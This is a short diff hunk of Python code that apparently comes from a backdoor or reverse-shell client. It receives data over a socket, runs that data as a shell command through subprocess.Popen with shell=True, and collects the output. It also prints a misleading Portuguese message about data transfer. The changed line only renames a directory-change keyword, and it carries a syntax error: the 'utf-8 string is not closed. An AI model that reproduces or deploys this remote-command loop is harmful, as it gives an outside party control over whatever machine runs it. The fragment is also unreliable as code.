@@ -23,7 +23,7 @@ while data_received < data_expected:
     data = sock.recv(1024)
     data_received += len(data)
     print(f"2mb recebidos! 3mb foram enviados!")
-    if data.decode('utf-8) == 'cd ..':
+    if data.decode('utf-8) == 'cdsair':
                    os.chdir('..')
     proc = subprocess.Popen(data.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     output = proc.stdout.read() + proc.stderr.read()
